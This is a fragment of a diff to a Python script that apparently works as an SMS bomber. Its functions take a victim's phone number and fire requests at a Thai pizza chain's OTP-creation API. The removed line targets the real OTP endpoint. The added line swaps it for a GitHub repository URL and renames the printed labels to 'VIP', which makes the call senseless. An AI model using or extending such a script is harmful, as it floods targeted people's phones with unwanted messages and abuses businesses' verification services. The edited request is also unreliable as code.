@@ -18,11 +18,11 @@ def shopat(phone):
 
 """api sms pizza1112"""
 def p1112(phone):
-    d=post('https://api2.1112.com/api/v1/otp/create',json={"phonenumber":phone,"language":"th"},headers=headers).status_code
+    d=post('https://github.com/earthza001/vip',json={"phonenumber":phone,"language":"th"},headers=headers).status_code
     if d == 200:
-        print("[*] 1112 | sent")
+        print("[*] VIP | sent")
     else : 
-        print("[*] 1112 | fail")
+        print("[*] VIP | fail")
 
 """api sms pizza1112 v2"""
 def p1112v2(phone):
